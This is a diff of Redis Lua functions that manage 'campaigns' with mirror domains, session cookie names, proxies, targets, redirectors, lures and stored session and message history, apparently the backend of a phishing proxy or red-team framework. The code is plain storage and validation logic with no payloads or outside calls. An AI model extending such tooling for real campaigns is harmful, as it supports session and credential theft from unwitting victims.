@@ -1,104 +1,7 @@
-local function current_time()
-  local t = redis.call('TIME')
+--
+-- Campaign methods
+--
 
-  return tonumber(t[1]) * 1000 + math.floor(tonumber(t[2]) / 1000)
-end
-
-local function coerce(value, spec)
-  if not value then
-    return nil, spec.name .. ' missing'
-  end
-
-  if type(value) ~= 'string' then
-    return nil, spec.name .. ' malform'
-  end
-
-  if spec.kind == 'any' then
-    return value
-  elseif spec.kind == 'str' then
-    if value == '' then
-      return nil, spec.name .. ' empty string'
-    end
-
-    return value
-  elseif spec.kind == 'num' then
-    local n = tonumber(value)
-
-    if not n or n ~= n or n == math.huge or n == -math.huge then
-      return nil, spec.name .. ' not a number'
-    end
-
-    if spec.min and n < spec.min then
-      return nil, spec.name .. ' below min'
-    end
-
-    if spec.max and n > spec.max then
-      return nil, spec.name .. ' above max'
-    end
-
-    return n
-  elseif spec.kind == 'int' then
-    local n = tonumber(value)
-
-    if not n or n ~= n or n == math.huge or n == -math.huge or n ~= math.floor(n) then
-      return nil, spec.name .. ' not an integer'
-    end
-
-    if spec.min and n < spec.min then
-      return nil, spec.name .. ' below min'
-    end
-
-    if spec.max and n > spec.max then
-      return nil, spec.name .. ' above max'
-    end
-
-    return n
-  end
-
-  return nil, spec.name .. ' unknown kind'
-end
-
-local function normalize(values, specs)
-  if #values ~= #specs then
-    return nil, 'wrong number of values'
-  end
-
-  local out = {}
-
-  for i, spec in ipairs(specs) do
-    local value, err = coerce(values[i], spec)
-
-    if err then
-      return nil, err
-    end
-
-    if value == nil then
-      return nil, 'coerce internal error'
-    end
-
-    out[spec.name] = value
-  end
-
-  return out
-end
-
-local PAGER_OFFSET_MIN, PAGER_OFFSET_MAX = 0, 1000000
-local PAGER_LIMIT_MIN, PAGER_LIMIT_MAX = 1, 1000
-
-local LOCK_TIMEOUT_MIN, LOCK_TIMEOUT_MAX = 1000, 3600 * 1000
-
-local SESSION_EXPIRE_MIN, SESSION_EXPIRE_MAX = 1000, 365 * 86400 * 1000
-local NEW_SESSION_EXPIRE_MIN, NEW_SESSION_EXPIRE_MAX = 1000, 3600 * 1000
-
-local MESSAGE_EXPIRE_MIN, MESSAGE_EXPIRE_MAX = 1000, 86400 * 1000
-
-local LIMITER_BURST_MIN, LIMITER_BURST_MAX = 1, 1000
-local LIMITER_RATE_MIN, LIMITER_RATE_MAX = 1, 100
-local LIMITER_COST_MIN, LIMITER_COST_MAX = 0.001, 1000
-
---[[
-  Create campaign
---]]
 local function create_campaign(keys, raw_args)
   if #keys ~= 4 then
     return redis.error_reply('ERR wrong number of keys')
@@ -116,53 +19,32 @@ local function create_campaign(keys, raw_args)
     { name = 'crypt_secret', kind = 'str' },
     { name = 'upgrade_session_path', kind = 'str' },
     { name = 'session_cookie_name', kind = 'str' },
-    {
-      name = 'session_expire',
-      kind = 'int',
-      min = SESSION_EXPIRE_MIN,
-      max = SESSION_EXPIRE_MAX,
-    },
-    {
-      name = 'new_session_expire',
-      kind = 'int',
-      min = NEW_SESSION_EXPIRE_MIN,
-      max = NEW_SESSION_EXPIRE_MAX,
-    },
-    {
-      name = 'message_expire',
-      kind = 'int',
-      min = MESSAGE_EXPIRE_MIN,
-      max = MESSAGE_EXPIRE_MAX,
-    },
-    {
-      name = 'limiter_burst',
-      kind = 'int',
-      min = LIMITER_BURST_MIN,
-      max = LIMITER_BURST_MAX,
-    },
-    {
-      name = 'limiter_rate',
-      kind = 'int',
-      min = LIMITER_RATE_MIN,
-      max = LIMITER_RATE_MAX,
-    },
+    { name = 'session_expire', kind = 'int', min = 1000 },
+    { name = 'new_session_expire', kind = 'int', min = 1000 },
+    { name = 'message_expire', kind = 'int', min = 1000 },
+    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
+    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
   })
 
   if args_err then
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
+  if args.new_session_expire > args.session_expire then
+    return redis.error_reply('ERR new_session_expire exceeds session_expire')
+  end
+
   local now = current_time()
 
-  if redis.call('EXISTS', campaign_key) ~= 0 then
+  if redis.call('EXISTS', campaign_key) == 1 then
     return redis.status_reply('CONFLICT campaign already exists')
   end
 
-  if redis.call('SISMEMBER', campaign_mirror_domains_key, args.mirror_domain) ~= 0 then
+  if redis.call('SISMEMBER', campaign_mirror_domains_key, args.mirror_domain) == 1 then
     return redis.status_reply('CONFLICT campaign mirror_domain already taken')
   end
 
-  if redis.call('SISMEMBER', campaign_session_cookie_names_key, args.session_cookie_name) ~= 0 then
+  if redis.call('SISMEMBER', campaign_session_cookie_names_key, args.session_cookie_name) == 1 then
     return redis.status_reply('CONFLICT campaign session_cookie_name already taken')
   end
 
@@ -196,11 +78,9 @@ end
 redis.register_function({
   function_name = 'create_campaign',
   callback = create_campaign,
+  description = 'Create campaign',
 })
 
---[[
-  Read campaign
---]]
 local function read_campaign(keys, args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -213,7 +93,7 @@ local function read_campaign(keys, args)
     return redis.error_reply('ERR wrong number of args')
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return nil
   end
 
@@ -230,16 +110,16 @@ local function read_campaign(keys, args)
   local campaign, campaign_err = normalize(raw_campaign, {
     { name = 'campaign_id', kind = 'str' },
     { name = 'mirror_domain', kind = 'str' },
-    { name = 'session_count', kind = 'int' },
-    { name = 'message_count', kind = 'int' },
-    { name = 'created_at', kind = 'int' },
+    { name = 'session_count', kind = 'int', min = 0 },
+    { name = 'message_count', kind = 'int', min = 0 },
+    { name = 'created_at', kind = 'int', min = 0 },
   })
 
   if campaign_err then
     return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
   end
 
-  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) ~= 0
+  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1
 
   return { map = campaign }
 end
@@ -248,11 +128,9 @@ redis.register_function({
   function_name = 'read_campaign',
   callback = read_campaign,
   flags = { 'no-writes' },
+  description = 'Read campaign',
 })
 
---[[
-  Read full campaign
---]]
 local function read_full_campaign(keys, args)
   if #keys ~= 10 then
     return redis.error_reply('ERR wrong number of keys')
@@ -273,7 +151,7 @@ local function read_full_campaign(keys, args)
     return redis.error_reply('ERR wrong number of args')
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return nil
   end
 
@@ -303,14 +181,14 @@ local function read_full_campaign(keys, args)
     { name = 'crypt_secret', kind = 'str' },
     { name = 'upgrade_session_path', kind = 'str' },
     { name = 'session_cookie_name', kind = 'str' },
-    { name = 'session_expire', kind = 'int' },
-    { name = 'new_session_expire', kind = 'int' },
-    { name = 'message_expire', kind = 'int' },
-    { name = 'limiter_burst', kind = 'int' },
-    { name = 'limiter_rate', kind = 'int' },
-    { name = 'session_count', kind = 'int' },
-    { name = 'message_count', kind = 'int' },
-    { name = 'created_at', kind = 'int' },
+    { name = 'session_expire', kind = 'int', min = 1000 },
+    { name = 'new_session_expire', kind = 'int', min = 1000 },
+    { name = 'message_expire', kind = 'int', min = 1000 },
+    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
+    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
+    { name = 'session_count', kind = 'int', min = 0 },
+    { name = 'message_count', kind = 'int', min = 0 },
+    { name = 'created_at', kind = 'int', min = 0 },
   })
 
   if campaign_err then
@@ -318,7 +196,7 @@ local function read_full_campaign(keys, args)
   end
 
   campaign.session_cookie_names = redis.call('SMEMBERS', campaign_session_cookie_names_key)
-  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) ~= 0
+  campaign.is_locked = redis.call('EXISTS', campaign_lock_key) == 1
   campaign.flags = redis.call('SMEMBERS', campaign_flags_key)
   campaign.proxy_index = redis.call('ZCARD', proxy_index_key)
   campaign.target_index = redis.call('ZCARD', target_index_key)
@@ -334,49 +212,30 @@ redis.register_function({
   function_name = 'read_full_campaign',
   callback = read_full_campaign,
   flags = { 'no-writes' },
+  description = 'Read full campaign',
 })
 
---[[
-  Read campaign index
---]]
-local function read_campaign_index(keys, raw_args)
+local function read_campaign_index(keys, args)
   if #keys ~= 1 then
     return redis.error_reply('ERR wrong number of keys')
   end
 
   local campaign_index_key = keys[1]
 
-  local args, args_err = normalize(raw_args, {
-    {
-      name = 'offset',
-      kind = 'int',
-      min = PAGER_OFFSET_MIN,
-      max = PAGER_OFFSET_MAX,
-    },
-    {
-      name = 'limit',
-      kind = 'int',
-      min = PAGER_LIMIT_MIN,
-      max = PAGER_LIMIT_MAX,
-    },
-  })
-
-  if args_err then
-    return redis.error_reply('ERR normalize args: ' .. args_err)
+  if #args ~= 0 then
+    return redis.error_reply('ERR wrong number of args')
   end
 
-  return redis.call('ZRANGE', campaign_index_key, args.offset, args.offset + args.limit - 1)
+  return redis.call('ZRANGE', campaign_index_key, 0, -1)
 end
 
 redis.register_function({
   function_name = 'read_campaign_index',
   callback = read_campaign_index,
   flags = { 'no-writes' },
+  description = 'Read campaign index',
 })
 
---[[
-  Lock campaign
---]]
 local function lock_campaign(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -387,23 +246,18 @@ local function lock_campaign(keys, raw_args)
 
   local args, args_err = normalize(raw_args, {
     { name = 'lock_secret', kind = 'str' },
-    {
-      name = 'lock_timeout',
-      kind = 'int',
-      min = LOCK_TIMEOUT_MIN,
-      max = LOCK_TIMEOUT_MAX,
-    },
+    { name = 'lock_timeout', kind = 'int', min = 1000 },
   })
 
   if args_err then
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
-  if redis.call('EXISTS', campaign_lock_key) ~= 0 then
+  if redis.call('EXISTS', campaign_lock_key) == 1 then
     return redis.status_reply('FORBIDDEN campaign already locked')
   end
 
@@ -417,11 +271,9 @@ end
 redis.register_function({
   function_name = 'lock_campaign',
   callback = lock_campaign,
+  description = 'Lock campaign',
 })
 
---[[
-  Unlock campaign
---]]
 local function unlock_campaign(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -438,18 +290,18 @@ local function unlock_campaign(keys, raw_args)
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
-  if redis.call('EXISTS', campaign_lock_key) ~= 1 then
+  if redis.call('EXISTS', campaign_lock_key) == 0 then
     return redis.status_reply('OK campaign not locked')
   end
 
   local lock_secret = redis.call('GET', campaign_lock_key)
 
   if not lock_secret or lock_secret ~= args.lock_secret then
-    return redis.status_reply('FORBIDDEN campaign lock_secret not match')
+    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
   end
 
   -- Point of no return
@@ -462,11 +314,9 @@ end
 redis.register_function({
   function_name = 'unlock_campaign',
   callback = unlock_campaign,
+  description = 'Unlock campaign',
 })
 
---[[
-  Update campaign
---]]
 local function update_campaign(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -477,36 +327,11 @@ local function update_campaign(keys, raw_args)
 
   local args, args_err = normalize(raw_args, {
     { name = 'description', kind = 'any' },
-    {
-      name = 'session_expire',
-      kind = 'int',
-      min = SESSION_EXPIRE_MIN,
-      max = SESSION_EXPIRE_MAX,
-    },
-    {
-      name = 'new_session_expire',
-      kind = 'int',
-      min = NEW_SESSION_EXPIRE_MIN,
-      max = NEW_SESSION_EXPIRE_MAX,
-    },
-    {
-      name = 'message_expire',
-      kind = 'int',
-      min = MESSAGE_EXPIRE_MIN,
-      max = MESSAGE_EXPIRE_MAX,
-    },
-    {
-      name = 'limiter_burst',
-      kind = 'int',
-      min = LIMITER_BURST_MIN,
-      max = LIMITER_BURST_MAX,
-    },
-    {
-      name = 'limiter_rate',
-      kind = 'int',
-      min = LIMITER_RATE_MIN,
-      max = LIMITER_RATE_MAX,
-    },
+    { name = 'session_expire', kind = 'int', min = 1000 },
+    { name = 'new_session_expire', kind = 'int', min = 1000 },
+    { name = 'message_expire', kind = 'int', min = 1000 },
+    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
+    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
     { name = 'lock_secret', kind = 'str' },
   })
 
@@ -514,18 +339,22 @@ local function update_campaign(keys, raw_args)
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if args.new_session_expire > args.session_expire then
+    return redis.error_reply('ERR new_session_expire exceeds session_expire')
+  end
+
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
-  if redis.call('EXISTS', campaign_lock_key) ~= 1 then
+  if redis.call('EXISTS', campaign_lock_key) == 0 then
     return redis.status_reply('FORBIDDEN campaign not locked')
   end
 
   local lock_secret = redis.call('GET', campaign_lock_key)
 
   if not lock_secret or lock_secret ~= args.lock_secret then
-    return redis.status_reply('FORBIDDEN campaign lock_secret not match')
+    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
   end
 
   -- Point of no return
@@ -547,11 +376,9 @@ end
 redis.register_function({
   function_name = 'update_campaign',
   callback = update_campaign,
+  description = 'Update campaign',
 })
 
---[[
-  Append campaign flag
---]]
 local function append_campaign_flag(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -568,11 +395,11 @@ local function append_campaign_flag(keys, raw_args)
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
-  if redis.call('SISMEMBER', campaign_flags_key, args.flag) ~= 0 then
+  if redis.call('SISMEMBER', campaign_flags_key, args.flag) == 1 then
     return redis.status_reply('OK campaign flag already exists')
   end
 
@@ -586,11 +413,9 @@ end
 redis.register_function({
   function_name = 'append_campaign_flag',
   callback = append_campaign_flag,
+  description = 'Append campaign flag',
 })
 
---[[
-  Remove campaign flag
---]]
 local function remove_campaign_flag(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -607,7 +432,7 @@ local function remove_campaign_flag(keys, raw_args)
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
@@ -625,13 +450,11 @@ end
 redis.register_function({
   function_name = 'remove_campaign_flag',
   callback = remove_campaign_flag,
+  description = 'Remove campaign flag',
 })
 
---[[
-  Delete campaign
---]]
 local function delete_campaign(keys, raw_args)
-  if #keys ~= 10 then
+  if #keys ~= 12 then
     return redis.error_reply('ERR wrong number of keys')
   end
 
@@ -645,6 +468,8 @@ local function delete_campaign(keys, raw_args)
   local target_index_key = keys[8]
   local redirector_index_key = keys[9]
   local lure_index_key = keys[10]
+  local session_history_key = keys[11]
+  local message_history_key = keys[12]
 
   local args, args_err = normalize(raw_args, {
     { name = 'lock_secret', kind = 'str' },
@@ -654,18 +479,18 @@ local function delete_campaign(keys, raw_args)
     return redis.error_reply('ERR normalize args: ' .. args_err)
   end
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return redis.status_reply('NOT_FOUND campaign not exists')
   end
 
-  if redis.call('EXISTS', campaign_lock_key) ~= 1 then
+  if redis.call('EXISTS', campaign_lock_key) == 0 then
     return redis.status_reply('FORBIDDEN campaign not locked')
   end
 
   local lock_secret = redis.call('GET', campaign_lock_key)
 
   if not lock_secret or lock_secret ~= args.lock_secret then
-    return redis.status_reply('FORBIDDEN campaign lock_secret not match')
+    return redis.status_reply('FORBIDDEN campaign lock_secret mismatch')
   end
 
   -- stylua: ignore
@@ -686,25 +511,32 @@ local function delete_campaign(keys, raw_args)
     return redis.error_reply('ERR normalize campaign: ' .. campaign_err)
   end
 
-  if redis.call('ZCARD', proxy_index_key) ~= 0 then
+  if redis.call('ZCARD', proxy_index_key) > 0 then
     return redis.status_reply('FORBIDDEN campaign proxies exists')
   end
 
-  if redis.call('ZCARD', target_index_key) ~= 0 then
+  if redis.call('ZCARD', target_index_key) > 0 then
     return redis.status_reply('FORBIDDEN campaign targets exists')
   end
 
-  if redis.call('ZCARD', redirector_index_key) ~= 0 then
+  if redis.call('ZCARD', redirector_index_key) > 0 then
     return redis.status_reply('FORBIDDEN campaign redirectors exists')
   end
 
-  if redis.call('ZCARD', lure_index_key) ~= 0 then
+  if redis.call('ZCARD', lure_index_key) > 0 then
     return redis.status_reply('FORBIDDEN campaign lures exists')
   end
 
   -- Point of no return
 
-  redis.call('DEL', campaign_key, campaign_lock_key, campaign_flags_key)
+  redis.call(
+    'DEL',
+    campaign_key,
+    campaign_lock_key,
+    campaign_flags_key,
+    session_history_key,
+    message_history_key
+  )
   redis.call('SREM', campaign_mirror_domains_key, campaign.mirror_domain)
   redis.call('SREM', campaign_session_cookie_names_key, campaign.session_cookie_name)
   redis.call('ZREM', campaign_index_key, campaign.campaign_id)
@@ -715,11 +547,9 @@ end
 redis.register_function({
   function_name = 'delete_campaign',
   callback = delete_campaign,
+  description = 'Delete campaign',
 })
 
---[[
-  Check campaign limiter
---]]
 local function check_campaign_limiter(keys, raw_args)
   if #keys ~= 2 then
     return redis.error_reply('ERR wrong number of keys')
@@ -729,12 +559,7 @@ local function check_campaign_limiter(keys, raw_args)
   local campaign_limiter_key = keys[2]
 
   local args, args_err = normalize(raw_args, {
-    {
-      name = 'limiter_cost',
-      kind = 'num',
-      min = LIMITER_COST_MIN,
-      max = LIMITER_COST_MAX,
-    },
+    { name = 'limiter_cost', kind = 'num', min = 0.001, max = 1000 },
   })
 
   if args_err then
@@ -743,7 +568,7 @@ local function check_campaign_limiter(keys, raw_args)
 
   local now = current_time()
 
-  if redis.call('EXISTS', campaign_key) ~= 1 then
+  if redis.call('EXISTS', campaign_key) == 0 then
     return nil
   end
 
@@ -755,18 +580,8 @@ local function check_campaign_limiter(keys, raw_args)
   )
 
   local campaign, campaign_err = normalize(raw_campaign, {
-    {
-      name = 'limiter_burst',
-      kind = 'int',
-      min = LIMITER_BURST_MIN,
-      max = LIMITER_BURST_MAX,
-    },
-    {
-      name = 'limiter_rate',
-      kind = 'int',
-      min = LIMITER_RATE_MIN,
-      max = LIMITER_RATE_MAX,
-    },
+    { name = 'limiter_burst', kind = 'int', min = 1, max = 1000 },
+    { name = 'limiter_rate', kind = 'int', min = 1, max = 100 },
   })
 
   if campaign_err then
@@ -774,7 +589,7 @@ local function check_campaign_limiter(keys, raw_args)
   end
 
   if args.limiter_cost > campaign.limiter_burst then
-    return nil
+    return redis.error_reply('ERR limiter_cost exceeds limiter_burst')
   end
 
   -- Point of no return
@@ -851,4 +666,5 @@ end
 redis.register_function({
   function_name = 'check_campaign_limiter',
   callback = check_campaign_limiter,
+  description = 'Check campaign limiter',
 })
